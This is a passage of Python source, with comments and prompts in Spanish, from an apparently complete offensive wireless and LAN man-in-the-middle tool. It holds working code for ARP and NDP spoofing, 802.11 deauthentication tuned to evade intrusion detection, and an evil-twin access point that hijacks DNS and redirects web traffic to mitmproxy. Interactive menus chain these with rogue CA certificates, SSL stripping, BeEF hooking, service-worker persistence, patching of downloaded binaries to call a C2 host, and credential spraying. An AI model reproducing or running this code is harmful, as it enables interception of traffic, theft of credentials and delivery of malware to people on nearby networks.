        hosts = []
        if ip_version == 4:
            resp, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), iface=interface, timeout=3)
            for _, r in resp:
                mac = r[ARP].hwsrc
                hosts.append({'ip': r[ARP].psrc, 'mac': mac, 'v': 4, 'os_inferred': NetworkScanner.infer_os_from_mac(mac)})
        else:
            resp, _ = srp(Ether(dst="33:33:00:00:00:01")/IPv6(dst="ff02::1")/ICMPv6ND_NS(tgt="::"), iface=interface, timeout=3, filter="icmp6 and ip6[40] == 136")
            for _, r in resp:
                if r[IPv6].src != "::":
                    mac = r[Ether].src
                    hosts.append({'ip': r[IPv6].src, 'mac': mac, 'v': 6, 'os_inferred': NetworkScanner.infer_os_from_mac(mac)})
        return hosts

class WiFiScanner: # WIFI SCANNER

    def __init__(self, iface_mon: str):
        self.iface_mon = iface_mon
        self.ap_list: Dict[str, Dict[str, Any]] = {}
        self.client_list: Dict[str, str] = {}
        self._scanning = False
        self._scan_thread: Optional[threading.Thread] = None

    def _packet_handler(self, pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr3
            if not bssid or bssid in self.ap_list:
                return
            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore') if pkt.haslayer(Dot11Elt) else "<Hidden>"
            try:
                stats = pkt[Dot11Beacon].network_stats()
                crypto = stats.get('crypto', set())
                channel = stats.get('channel', 0)
            except Exception:
                crypto = set()
                channel = 0

            self.ap_list[bssid] = {
                'ssid': ssid,
                'bssid': bssid,
                'channel': channel,
                'crypto': list(crypto),
                'clients': set(),
                'signal': getattr(pkt, 'dBm_AntSignal', -100),
                'first_seen': datetime.now().isoformat()
            }
            log.debug(f"[WIFI SCAN] AP detectado: {ssid} ({bssid}) CH:{channel} ENC:{crypto}")

        elif pkt.haslayer(Dot11) and pkt.type == 2:
            # Data frames - identificar clientes asociados
            addr1 = pkt[Dot11].addr1
            addr2 = pkt[Dot11].addr2
            if addr1 in self.ap_list and addr2 and addr2 not in self.ap_list:
                self.ap_list[addr1]['clients'].add(addr2)
                self.client_list[addr2] = addr1
            elif addr2 in self.ap_list and addr1 and addr1 not in self.ap_list:
                self.ap_list[addr2]['clients'].add(addr1)
                self.client_list[addr1] = addr2

    def scan(self, duration: int = 15, channels: List[int] = None) -> List[Dict[str, Any]]:
        log.warning(f"Iniciando escaneo WiFi pasivo en {self.iface_mon} durante {duration}s...")
        self.ap_list.clear()
        self.client_list.clear()

        if channels is None:
            channels = list(range(1, 15))  # 2.4GHz

        def channel_hopper():
            for ch in channels:
                if not self._scanning:
                    break
                subprocess.run(["iw", "dev", self.iface_mon, "set", "channel", str(ch)], capture_output=True)
                time.sleep(0.4)

        self._scanning = True
        hopper_thread = threading.Thread(target=channel_hopper, daemon=True)
        hopper_thread.start()

        sniff(iface=self.iface_mon, prn=self._packet_handler, timeout=duration, store=False)
        self._scanning = False
        hopper_thread.join(timeout=2)

        results = []
        for bssid, data in self.ap_list.items():
            entry = dict(data)
            entry['clients'] = list(data['clients'])
            results.append(entry)

        log.warning(f"Escaneo completado. APs detectados: {len(results)}")
        return sorted(results, key=lambda x: x['signal'], reverse=True)

    @staticmethod
    def set_monitor_mode(iface: str) -> Optional[str]:
        """Configura la interfaz en modo monitor. Devuelve el nombre de la interfaz monitor."""
        try:
            # Verificar si ya existe una interfaz monitor
            res = subprocess.run(["iw", "dev"], capture_output=True, text=True)
            mon_ifaces = re.findall(r'Interface\s+(\w+)', res.stdout)
            for mon in mon_ifaces:
                if 'mon' in mon.lower():
                    log.info(f"Interfaz monitor existente detectada: {mon}")
                    return mon

            # Crear interfaz monitor
            log.warning(f"Configurando modo monitor en {iface}...")
            subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True, check=True)
            subprocess.run(["iw", iface, "set", "monitor", "none"], capture_output=True, check=True)
            subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True, check=True)
            log.alert(f"Modo monitor activado en {iface}")
            return iface
        except subprocess.CalledProcessError as e:
            log.error(f"Fallo al configurar modo monitor: {e}")
            return None

    @staticmethod
    def restore_managed_mode(iface: str) -> bool:
        try:
            subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True, check=True)
            subprocess.run(["iw", iface, "set", "type", "managed"], capture_output=True, check=True)
            subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True, check=True)
            log.info(f"Interfaz {iface} restaurada a modo managed")
            return True
        except subprocess.CalledProcessError as e:
            log.error(f"Error restaurando modo managed: {e}")
            return False

class WiFiDeauthEngine: # DEAUTH ENGINE
    """
    Motor de desautenticacion 802.11 direccional.
    Inunda al cliente objetivo y al AP con tramas Deauth para forzar la reasociacion.
    Implementa duty cycle controlado para evitar deteccion por WIDS.
    """

    def __init__(self, iface_mon: str, target_client: str, target_ap: str):
        self.iface_mon = iface_mon
        self.target_client = target_client
        self.target_ap = target_ap
        self.running = False
        self._thread: Optional[threading.Thread] = None
        self.packets_sent = 0
        self.burst_size = 10
        self.burst_interval = 15  # segundos entre rafagas

    def _build_deauth_packet(self, src: str, dst: str) -> RadioTap:
        return RadioTap() / Dot11(addr1=dst, addr2=src, addr3=src) / Dot11Deauth(reason=7)

    def _attack_loop(self):
        pkt_ap_to_client = self._build_deauth_packet(self.target_ap, self.target_client)
        pkt_client_to_ap = self._build_deauth_packet(self.target_client, self.target_ap)

        log.warning(f"Deauth activo: {self.target_client} <-> {self.target_ap}")

        while self.running:
            for _ in range(self.burst_size):
                if not self.running:
                    break
                sendp(pkt_ap_to_client, iface=self.iface_mon, verbose=False)
                sendp(pkt_client_to_ap, iface=self.iface_mon, verbose=False)
                self.packets_sent += 2
                time.sleep(0.05)

            if self.running:
                log.debug(f"Deauth rafaga completada. Pausa {self.burst_interval}s...")
                time.sleep(self.burst_interval)

    def start(self):
        log.alert(f"Iniciando motor Deauth contra cliente {self.target_client} (AP: {self.target_ap})")
        self.running = True
        self._thread = threading.Thread(target=self._attack_loop, daemon=True)
        self._thread.start()

    def stop(self):
        log.info(f"Deteniendo Deauth. Total tramas enviadas: {self.packets_sent}")
        self.running = False
        if self._thread:
            self._thread.join(timeout=3)

class RogueAPEngine: # ROGUE AP ENGINE (EVIL TWIN)

    def __init__(self, iface: str, ssid: str, bssid: str, channel: int,
                 ap_ip: str = "10.9.0.1", subnet: str = "10.9.0.0/24",
                 dhcp_range: str = "10.9.0.10,10.9.0.250,255.255.255.0,12h",
                 wpa_passphrase: str = "", proxy_port: int = 8080):
        self.iface = iface
        self.ssid = ssid
        self.bssid = bssid
        self.channel = channel
        self.ap_ip = ap_ip
        self.subnet = subnet
        self.dhcp_range = dhcp_range
        self.wpa_passphrase = wpa_passphrase
        self.proxy_port = proxy_port

        self.hostapd_conf_path = Path("/tmp/mitm_operation/hostapd.conf")
        self.dnsmasq_conf_path = Path("/tmp/mitm_operation/dnsmasq.conf")
        self.hostapd_proc: Optional[subprocess.Popen] = None
        self.dnsmasq_proc: Optional[subprocess.Popen] = None
        self.running = False

    def _generate_hostapd_conf(self) -> str:
        conf = f"""
interface={self.iface}
driver=nl80211
ssid={self.ssid}
bssid={self.bssid}
hw_mode=g
channel={self.channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
        if self.wpa_passphrase:
            conf += f"""
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
rsn_pairwise=CCMP
wpa_passphrase={self.wpa_passphrase}
"""
        else:
            conf += "\nauth_algs=1\nwpa=0\n"

        conf += f"""
# Rendimiento y compatibilidad
ieee80211n=1
wmm_enabled=1

# Logging
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
"""
        return conf

    def _generate_dnsmasq_conf(self) -> str:
        return f"""
interface={self.iface}
bind-interfaces
server=8.8.8.8
address=/#/{self.ap_ip}
dhcp-range={self.dhcp_range}
dhcp-option=3,{self.ap_ip}
dhcp-option=6,{self.ap_ip}
log-queries
log-dhcp
"""

    def _configure_network(self):
        log.info(f"Configurando interfaz AP {self.iface} con IP {self.ap_ip}...")
        subprocess.run(["ip", "link", "set", self.iface, "up"], capture_output=True)
        subprocess.run(["ip", "addr", "flush", "dev", self.iface], capture_output=True)
        subprocess.run(["ip", "addr", "add", f"{self.ap_ip}/24", "dev", self.iface], capture_output=True)

        # Habilitar forwarding y NAT
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
        subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
        subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"], capture_output=True)

        # Redireccion al proxy MITM
        for port in [80, 443, 8080, 8443]:
            subprocess.run([
                "iptables", "-t", "nat", "-A", "PREROUTING", "-i", self.iface,
                "-p", "tcp", "--dport", str(port), "-j", "REDIRECT", "--to-port", str(self.proxy_port)
            ], capture_output=True)

    def _restore_network(self):
        log.info("Restaurando configuracion de red del AP...")
        subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
        subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"], capture_output=True)
        subprocess.run(["ip", "addr", "flush", "dev", self.iface], capture_output=True)

    def start(self) -> bool:
        log.alert(f"Levantando Evil Twin: SSID='{self.ssid}' BSSID={self.bssid} CH={self.channel}")

        # Escribir configuraciones
        self.hostapd_conf_path.parent.mkdir(parents=True, exist_ok=True)
        with open(self.hostapd_conf_path, 'w') as f:
            f.write(self._generate_hostapd_conf())
        with open(self.dnsmasq_conf_path, 'w') as f:
            f.write(self._generate_dnsmasq_conf())

        self._configure_network()

        # Matar procesos previos
        subprocess.run(["killall", "hostapd"], capture_output=True)
        subprocess.run(["killall", "dnsmasq"], capture_output=True)
        time.sleep(1)

        try:
            self.dnsmasq_proc = subprocess.Popen(
                ["dnsmasq", "-C", str(self.dnsmasq_conf_path), "-d"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            time.sleep(0.5)

            self.hostapd_proc = subprocess.Popen(
                ["hostapd", str(self.hostapd_conf_path)],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            time.sleep(2)

            if self.hostapd_proc.poll() is not None:
                err = self.hostapd_proc.stderr.read().decode() if self.hostapd_proc.stderr else "Unknown"
                log.error(f"hostapd fallo al iniciar: {err}")
                self.stop()
                return False

            self.running = True
            log.alert("Evil Twin activo. Esperando asociaciones de clientes...")
            return True

        except Exception as e:
            log.error(f"Error iniciando Evil Twin: {e}")
            self.stop()
            return False

    def stop(self):
        log.info("Deteniendo Evil Twin y servicios asociados...")
        self.running = False

        if self.hostapd_proc:
            self.hostapd_proc.terminate()
            try:
                self.hostapd_proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                self.hostapd_proc.kill()

        if self.dnsmasq_proc:
            self.dnsmasq_proc.terminate()
            try:
                self.dnsmasq_proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                self.dnsmasq_proc.kill()

        subprocess.run(["killall", "-9", "hostapd"], capture_output=True)
        subprocess.run(["killall", "-9", "dnsmasq"], capture_output=True)

        self._restore_network()
        log.info("Evil Twin detenido.")

    def get_associated_clients(self) -> List[str]:
        """Consulta hostapd_cli para obtener clientes asociados."""
        try:
            res = subprocess.run(["hostapd_cli", "-i", self.iface, "list_sta"],
                               capture_output=True, text=True, timeout=2)
            clients = [line.strip() for line in res.stdout.split('\n') if line.strip() and ':' in line]
            return clients
        except Exception:
            return []

class MITMOrchestrator: #  ORQUESTADOR
    MODES = {
        '1': ('capture', 'Captura pasiva de trafico'),
        '2': ('inject', 'Inyeccion de payloads / BeEF'),
        '3': ('sslstrip', 'Forzar downgrade SSL/TLS'),
        '4': ('full', 'Activar todos los motores'),
    }

    def __init__(self):
        self.spoofer = None
        self.dhcpv6 = None
        self.dns_spoofer = None
        self.cert_manager = None
        self.addon = None
        self.master = None

        # Wireless
        self.wifi_scanner = None
        self.deauth_engine = None
        self.rogue_ap = None

    def _sig_handler(self, signum, frame):
        log.warning("Senal de terminacion recibida. Ejecutando limpieza de emergencia...")
        self.shutdown(); sys.exit(0)

    def shutdown(self):
        log.info("Iniciando secuencia de apagado ordenado...")
        if self.deauth_engine: self.deauth_engine.stop()
        if self.rogue_ap: self.rogue_ap.stop()
        if self.spoofer: self.spoofer.stop()
        if self.dhcpv6: self.dhcpv6.stop()
        if self.dns_spoofer: self.dns_spoofer.stop()
        if self.addon: self.addon.done()
        log.info("Apagado completado.")

    def execute_attack(self, iface: str, gateway: str, target: str, mode: str, beef_url: str,
                       use_web_ui: bool, enable_dhcpv6: bool, dns_config: Optional[Dict[str, str]],
                       generate_ca: bool, enable_sw: bool = False, enable_binary_patch: bool = False,
                       enable_ws_grpc: bool = False, enable_spray: bool = False,
                       c2_host: str = "10.9.0.1", c2_port: int = 4444):
        signal.signal(signal.SIGINT, self._sig_handler)
        signal.signal(signal.SIGTERM, self._sig_handler)

        self.addon = InterceptAddon(mode=mode, beef_hook_url=beef_url, enable_sw=enable_sw,
                                    enable_binary_patch=enable_binary_patch, enable_ws_grpc=enable_ws_grpc,
                                    enable_spray=enable_spray, c2_host=c2_host, c2_port=c2_port)

        if generate_ca:
            self.cert_manager = CertificateAuthorityManager(self.addon.output_dir)
            self.cert_manager.generate_rogue_ca()

        if is_ipv6(target):
            log.warning(f"Vector identificado: IPv6 NDP Spoofing contra {target}")
            self.spoofer = NDPSpoofer(iface, gateway, target)
        else:
            log.warning(f"Vector identificado: IPv4 ARP Spoofing contra {target}")
            self.spoofer = ARPSpoofer(iface, gateway, target)

        if not self.spoofer.start():
            log.error("Fallo critico al levantar el vector de spoofing. Abortando operacion.")
            return

        if enable_dhcpv6:
            net_info = NetworkScanner.get_local_info()
            attacker_ll = net_info['ipv6'].get('link_local', 'fe80::1')
            rogue_dns = net_info['ipv4'].get('local_ip', '127.0.0.1')
            self.dhcpv6 = DHCPv6Spoofer(iface, attacker_ll, rogue_dns)
            self.dhcpv6.start()

        if dns_config and dns_config.get('rules'):
            target_for_dns = None if dns_config.get('broadcast') else target
            self.dns_spoofer = DNSSpoofer(iface, target_for_dns, dns_config['rules'])
            self.dns_spoofer.start()

        log.warning(f"Configuracion final: Target={target} | Gateway={gateway} | Modo={mode}")
        if beef_url: log.alert(f"Integracion BeEF armada: {beef_url}")
        if use_web_ui: log.alert(f"Interfaz Web de visualizacion habilitada en puerto 8081")
        log.warning("Esperando trafico interceptado...")

        try:
            opts = options.Options(
                listen_port=8080,
                mode="transparent",
                ssl_insecure=True,
                ssl_version_tls_1_3=False
            )

            if use_web_ui:
                opts.web_host = "0.0.0.0"; opts.web_port = 8081
                self.master = WebMaster(opts)
            else:
                self.master = DumpMaster(opts)

            self.master.addons.add(self.addon)
            asyncio.run(self.master.run())
        except Exception as e:
            log.error(f"Error en el motor mitmproxy: {e}")
        finally:
            self.shutdown()

    def execute_proxy_only(self, mode: str, beef_url: str, use_web_ui: bool,
                           enable_sw: bool = False, enable_binary_patch: bool = False,
                           enable_ws_grpc: bool = False, enable_spray: bool = False,
                           c2_host: str = "10.9.0.1", c2_port: int = 4444):
        self.addon = InterceptAddon(mode=mode, beef_hook_url=beef_url, enable_sw=enable_sw,
                                    enable_binary_patch=enable_binary_patch, enable_ws_grpc=enable_ws_grpc,
                                    enable_spray=enable_spray, c2_host=c2_host, c2_port=c2_port)
        log.info("Iniciando modo Proxy Local (Sin vectors activos de red)")
        try:
            opts = options.Options(listen_host="::", listen_port=8080, ssl_insecure=True)
            if use_web_ui:
                opts.web_host = "0.0.0.0"; opts.web_port = 8081
                self.master = WebMaster(opts)
            else: self.master = DumpMaster(opts)
            self.master.addons.add(self.addon)
            asyncio.run(self.master.run())
        except Exception as e: log.error(e)
        finally:
            if self.addon: self.addon.done()

    # DEAUTH + EVIL TWIN + MITM


    def execute_wireless_takeover(self, iface_mon: str, target_ap: Dict[str, Any],
                                   target_client: str, mode: str, beef_url: str,
                                   use_web_ui: bool, generate_ca: bool, wpa_pass: str = "",
                                   enable_sw: bool = False, enable_binary_patch: bool = False,
                                   enable_ws_grpc: bool = False, enable_spray: bool = False,
                                   c2_host: str = "10.9.0.1", c2_port: int = 4444):
        """
        Ejecuta el ataque completo WiFi: Deauth + Evil Twin + MITM Proxy.
        El trafico del cliente se redirige automaticamente al proxy transparente.
        """
        signal.signal(signal.SIGINT, self._sig_handler)
        signal.signal(signal.SIGTERM, self._sig_handler)

        ssid = target_ap['ssid']
        bssid = target_ap['bssid']
        channel = target_ap['channel']

        log.alert("=" * 70)
        log.alert("INICIANDO SECUENCIA")
        log.alert("=" * 70)
        log.warning(f"Objetivo AP : {ssid} ({bssid}) CH:{channel}")
        log.warning(f"Objetivo STA: {target_client}")

        self.addon = InterceptAddon(mode=mode, beef_hook_url=beef_url, enable_sw=enable_sw,
                                    enable_binary_patch=enable_binary_patch, enable_ws_grpc=enable_ws_grpc,
                                    enable_spray=enable_spray, c2_host=c2_host, c2_port=c2_port)

        if generate_ca:
            self.cert_manager = CertificateAuthorityManager(self.addon.output_dir)
            self.cert_manager.generate_rogue_ca()

        # 1. Levantar Evil Twin
        self.rogue_ap = RogueAPEngine(
            iface=iface_mon,
            ssid=ssid,
            bssid=bssid,
            channel=channel,
            wpa_passphrase=wpa_pass,
            proxy_port=8080
        )

        if not self.rogue_ap.start():
            log.error("Fallo critico al levantar Evil Twin. Abortando.")
            return

        # 2. Iniciar Deauth contra el cliente
        self.deauth_engine = WiFiDeauthEngine(iface_mon, target_client, bssid)
        self.deauth_engine.start()

        # 3. Esperar asociacion del cliente al Evil Twin
        log.warning("Esperando asociacion del cliente al Evil Twin (timeout 60s)...")
        client_associated = False
        for i in range(60):
            clients = self.rogue_ap.get_associated_clients()
            if target_client.lower() in [c.lower() for c in clients]:
                client_associated = True
                log.alert(f"CLIENTE CAPTURADO: {target_client} asociado al Evil Twin!")
                break
            time.sleep(1)
            if i % 10 == 0:
                log.info(f"Esperando asociacion... ({i}s transcurridos)")

        if not client_associated:
            log.warning("Timeout esperando asociacion. Continuando de todos modos...")

        # 4. Levantar MITM Proxy
        log.warning("Levantando motor MITM Proxy en modo transparente...")
        try:
            opts = options.Options(
                listen_port=8080,
                mode="transparent",
                ssl_insecure=True,
                ssl_version_tls_1_3=False
            )

            if use_web_ui:
                opts.web_host = "0.0.0.0"; opts.web_port = 8081
                self.master = WebMaster(opts)
            else:
                self.master = DumpMaster(opts)

            self.master.addons.add(self.addon)
            asyncio.run(self.master.run())
        except Exception as e:
            log.error(f"Error en el motor mitmproxy: {e}")
        finally:
            self.shutdown()

#  INTERFAZ DE CONSOLA
def banner():
    print("""
+=======================================================================+
|                                                                       |
|             			Test			                |
|                                                                       |
+=======================================================================+
""")

def parse_dns_rules_input(rules_str: str, attacker_ip: str) -> Dict[str, str]:
    rules_map = {}
    if not rules_str.strip(): return {}
    domains = [d.strip() for d in rules_str.split(',') if d.strip()]
    for domain in domains:
        mod_domain = f"*.{domain}" if not domain.startswith('*.') else domain
        rules_map[mod_domain] = attacker_ip
    return rules_map

def menu_post_exploitation():
    base_dir = Path("/tmp/mitm_operation")
    if not base_dir.exists():
        print("\n[!] No se encontraron operaciones previas en /tmp/mitm_operation")
        return

    print("\n[+] Archivos de operaciones encontrados:")
    files = list(base_dir.glob("*"))
    if not files: print("    (Vacio)"); return

    for i, f in enumerate(files[:15], 1):
        f_type = "DIR" if f.is_dir() else "FILE"
        print(f"    {i}. [{f_type}] {f.name}")

    sel = input("\n[?] Seleccionar archivo para visualizar contenido (numero, Enter para volver): ").strip()
    if not sel: return

    try:
        idx = int(sel) - 1
        target_file = files[idx]
        if target_file.is_file():
            if target_file.suffix in ['.json', '.jsonl']:
                with open(target_file, 'r') as f_content:
                    for line in f_content.readlines()[:20]:
                        print(f"  {line.strip()}")
            else:
                with open(target_file, 'r') as f_content:
                    print(f_content.read()[:1000])
    except (ValueError, IndexError):
        print("[!] Opcion invalida")

def menu_scan_and_attack(orch: MITMOrchestrator):
    net = NetworkScanner.get_local_info()
    iface = net['interface']
    print(f"\n[*] Interfaz Detectada: {iface}")
    print(f"[*] IPv4 Local: {net['ipv4'].get('local_ip')} | Gateway: {net['ipv4'].get('gateway')}")
    if net['ipv6'].get('link_local'): print(f"[*] IPv6 Link-Local: {net['ipv6']['link_local']}")

    proto_opt = input("\n[?] Protocolo de escaneo (1=IPv4, 2=IPv6) [1]: ").strip()
    targets = NetworkScanner.scan_hosts(net['ipv4']['network'], iface, 4 if proto_opt != '2' else 6)

    if not targets: print("\n[!] No se descubrieron objetivos en la red."); return

    print(f"\n[+] Objetivos descubiertos ({len(targets)}):")
    print("-" * 90)
    for i, h in enumerate(targets, 1):
        print(f"    {i}. [IPv{h['v']}] {h['ip']:40s} {h['mac']:20s} OS: {h['os_inferred']}")
    print("-" * 90)

    try:
        sel = int(input("\n[?] Seleccionar objetivo (numero): ")) - 1
        if 0 <= sel < len(targets):
            target_ip = targets[sel]['ip']
            gw = net['ipv6'].get('gateway', 'fe80::1') if targets[sel]['v'] == 6 else net['ipv4'].get('gateway')
            launch_attack_sequence(orch, iface, gw, target_ip, net['ipv4'].get('local_ip'))
    except ValueError: print("[!] Entrada invalida.")

def menu_manual_attack(orch: MITMOrchestrator):
    net = NetworkScanner.get_local_info()
    target = input("[?] IP del objetivo (IPv4 o IPv6): ").strip()
    if not target: return
    iface = input(f"[?] Interfaz de red [{net['interface']}]: ").strip() or net['interface']
    gw_type = 'ipv6' if is_ipv6(target) else 'ipv4'
    gw = input(f"[?] Gateway [{net[gw_type].get('gateway')}]: ").strip() or net[gw_type].get('gateway')
    launch_attack_sequence(orch, iface, gw, target, net['ipv4'].get('local_ip'))

def launch_attack_sequence(orch: MITMOrchestrator, iface: str, gateway: str, target: str, local_ipv4: str):
    print("\n[*] Modos de operacion disponibles:")
    for k, (m, d) in MITMOrchestrator.MODES.items(): print(f"    {k}. {m.upper():12s} - {d}")
    mode_sel = input("\n[?] Seleccionar modo [1-4]: ").strip()
    mode, _ = MITMOrchestrator.MODES.get(mode_sel, ('capture', ''))

    beef_url = input("[?] URL del Hook BeEF (Enter para omitir): ").strip()
    if beef_url and not beef_url.startswith("http"): beef_url = f"http://{beef_url}"

    web_ui = input("[?] Habilitar Interfaz Web mitmweb (puerto 8081)? (s/n) [n]: ").strip().lower() == 's'

    gen_ca = input("[?] Generar e inyectar Rogue CA para Certificate Spoofing? (s/n) [s]: ").strip().lower() != 'n'

    enable_dhcpv6 = False
    if is_ipv6(target):
        enable_dhcpv6 = input("[?] El objetivo es IPv6. Activar DHCPv6 Rogue DNS? (s/n) [s]: ").strip().lower() != 'n'
    else:
        enable_dhcpv6 = input("[?] Activar motor DHCPv6 Rogue (afecta VLAN IPv6)? (s/n) [n]: ").strip().lower() == 's'

    dns_config = None
    enable_dns = input("[?] Activar DNS Spoofing / Hijacking? (s/n) [n]: ").strip().lower() == 's'
    if enable_dns:
        print("[!] Formato: dominio1.com, dominio2.com (Se secuestraran subdominios automaticamente)")
        domains_str = input("[?] Dominios a secuestrar: ").strip()
        redirect_ip = input(f"[?] IP a la que redirigir el DNS [{local_ipv4}]: ").strip() or local_ipv4
        broadcast = input("[?] Aplicar a toda la red local? (s/n) [n]: ").strip().lower() == 's'
        rules = parse_dns_rules_input(domains_str, redirect_ip)
        if rules:
            dns_config = {'rules': rules, 'broadcast': broadcast}
            log.info(f"Reglas DNS procesadas: {len(rules)} dominios apuntando a {redirect_ip}")
        else: print("[!] No se proporcionaron dominios validos. DNS Spoofing deshabilitado.")

    # Post-explotacion avanzada
    print("\n[*] Modulos de Post-Explotacion Avanzada:")
    enable_sw = input("[?] Activar Service Worker Injection (persistencia web)? (s/n) [n]: ").strip().lower() == 's'
    enable_bp = input("[?] Activar Binary Patching en descargas? (s/n) [n]: ").strip().lower() == 's'
    enable_wsg = input("[?] Activar WebSocket/gRPC Parser? (s/n) [n]: ").strip().lower() == 's'
    enable_spray = input("[?] Activar Credential Spraying automatico? (s/n) [n]: ").strip().lower() == 's'

    c2_host = "10.9.0.1"
    c2_port = 4444
    if enable_bp:
        c2_host = input(f"[?] Host C2 para payloads [{c2_host}]: ").strip() or c2_host
        c2_port_s = input(f"[?] Puerto C2 [{c2_port}]: ").strip()
        if c2_port_s: c2_port = int(c2_port_s)

    orch.execute_attack(iface, gateway, target, mode, beef_url, web_ui, enable_dhcpv6,
                        dns_config, gen_ca, enable_sw, enable_bp, enable_wsg, enable_spray,
                        c2_host, c2_port)

# MENU WIRELESS

def menu_wireless_takeover(orch: MITMOrchestrator):
    print("\n[*] Deauth + Evil Twin + MITM")
    print("[*] Requisitos: Interfaz WiFi con modo monitor e inyeccion de tramas.")

    iface = input("[?] Interfaz WiFi (ej: wlan0, wlp2s0): ").strip()
    if not iface:
        print("[!] Interfaz requerida.")
        return

    # Configurar modo monitor
    iface_mon = WiFiScanner.set_monitor_mode(iface)
    if not iface_mon:
        print("[!] No se pudo configurar modo monitor. Verifica hardware y drivers.")
        return

    scanner = WiFiScanner(iface_mon)

    print("\n[*] Iniciando escaneo pasivo de redes WiFi...")
    aps = scanner.scan(duration=20)

    if not aps:
        print("[!] No se detectaron redes WiFi. Verifica antena y cobertura.")
        WiFiScanner.restore_managed_mode(iface_mon)
        return

    print(f"\n[+] Redes WiFi detectadas ({len(aps)}):")
    print("-" * 100)
    print(f"    {'#':<4} {'SSID':<25} {'BSSID':<18} {'CH':<4} {'CRYPTO':<20} {'CLIENTS':<8} {'SIGNAL':<6}")
    print("-" * 100)
    for i, ap in enumerate(aps, 1):
        crypto = ",".join(ap['crypto']) if ap['crypto'] else "OPEN"
        clients = len(ap['clients'])
        print(f"    {i:<4} {ap['ssid'][:24]:<25} {ap['bssid']:<18} {ap['channel']:<4} {crypto:<20} {clients:<8} {ap['signal']:<6}")
    print("-" * 100)

    try:
        sel = int(input("\n[?] Seleccionar AP objetivo (numero): ")) - 1
        if sel < 0 or sel >= len(aps):
            print("[!] Seleccion invalida.")
            WiFiScanner.restore_managed_mode(iface_mon)
            return
        target_ap = aps[sel]
    except ValueError:
        print("[!] Entrada invalida.")
        WiFiScanner.restore_managed_mode(iface_mon)
        return

    # Seleccionar cliente objetivo
    clients = target_ap.get('clients', [])
    target_client = ""

    if clients:
        print(f"\n[+] Clientes detectados en {target_ap['ssid']}:")
        for i, mac in enumerate(clients, 1):
            print(f"    {i}. {mac}")
        print("    0. Broadcast (todos los clientes)")

        try:
            csel = int(input("\n[?] Seleccionar cliente a desautenticar (numero): ")) - 1
            if csel >= 0 and csel < len(clients):
                target_client = clients[csel]
            else:
                target_client = "ff:ff:ff:ff:ff:ff"
        except ValueError:
            target_client = "ff:ff:ff:ff:ff:ff"
    else:
        print("[!] No se detectaron clientes. Usando broadcast.")
        target_client = "ff:ff:ff:ff:ff:ff"

    print(f"\n[*] AP Objetivo : {target_ap['ssid']} ({target_ap['bssid']})")
    print(f"[*] Cliente     : {target_client}")

    # Configuracion del ataque
    wpa_pass = ""
    if target_ap['crypto'] and 'WPA' in str(target_ap['crypto']):
        wpa_pass = input("[?] Clave WPA para el Evil Twin (Enter para AP abierto): ").strip()

    print("\n[*] Modos de operacion MITM:")
    for k, (m, d) in MITMOrchestrator.MODES.items(): print(f"    {k}. {m.upper():12s} - {d}")
    mode_sel = input("\n[?] Seleccionar modo [1-4]: ").strip()
    mode, _ = MITMOrchestrator.MODES.get(mode_sel, ('capture', ''))

    beef_url = input("[?] URL del Hook BeEF (Enter para omitir): ").strip()
    if beef_url and not beef_url.startswith("http"): beef_url = f"http://{beef_url}"

    web_ui = input("[?] Habilitar Interfaz Web mitmweb (puerto 8081)? (s/n) [n]: ").strip().lower() == 's'
    gen_ca = input("[?] Generar Rogue CA para SSL/TLS Spoofing? (s/n) [s]: ").strip().lower() != 'n'

    # Post-explotacion avanzada
    print("\n[*] Modulos de Post-Explotacion Avanzada:")
    enable_sw = input("[?] Activar Service Worker Injection (persistencia web)? (s/n) [n]: ").strip().lower() == 's'
    enable_bp = input("[?] Activar Binary Patching en descargas? (s/n) [n]: ").strip().lower() == 's'
    enable_wsg = input("[?] Activar WebSocket/gRPC Parser? (s/n) [n]: ").strip().lower() == 's'
    enable_spray = input("[?] Activar Credential Spraying automatico? (s/n) [n]: ").strip().lower() == 's'

    c2_host = "10.9.0.1"
    c2_port = 4444
    if enable_bp:
        c2_host = input(f"[?] Host C2 para payloads [{c2_host}]: ").strip() or c2_host
        c2_port_s = input(f"[?] Puerto C2 [{c2_port}]: ").strip()
        if c2_port_s: c2_port = int(c2_port_s)

    print("\n[*] Iniciando secuencia completa en 3 segundos...")
    time.sleep(3)

    orch.execute_wireless_takeover(
        iface_mon=iface_mon,
        target_ap=target_ap,
        target_client=target_client,
        mode=mode,
        beef_url=beef_url,
        use_web_ui=web_ui,
        generate_ca=gen_ca,
        wpa_pass=wpa_pass,
        enable_sw=enable_sw,
        enable_binary_patch=enable_bp,
        enable_ws_grpc=enable_wsg,
        enable_spray=enable_spray,
        c2_host=c2_host,
        c2_port=c2_port
    )

    # Restaurar interfaz al salir
    WiFiScanner.restore_managed_mode(iface_mon)


def main():
    banner()
    if os.geteuid() != 0:
        print("[!] ERROR: Se requieren privilegios de root (sudo).")
        sys.exit(1)

    if not CRYPTO_AVAILABLE:
        print("[!] ADVERTENCIA: 'cryptography' no instalada. SSL/TLS Spoofing deshabilitado.")
        print("[!] Ejecuta: pip3 install cryptography")

    try: import mitmproxy
    except ImportError:
        print("[!] DEPENDENCIA CRITICA: mitmproxy no instalada.")
        print("[!] Ejecuta: pip3 install mitmproxy scapy")
        sys.exit(1)

    # Verificar dependencias wireless
    for tool in ['hostapd', 'dnsmasq', 'iw']:
        if shutil.which(tool) is None:
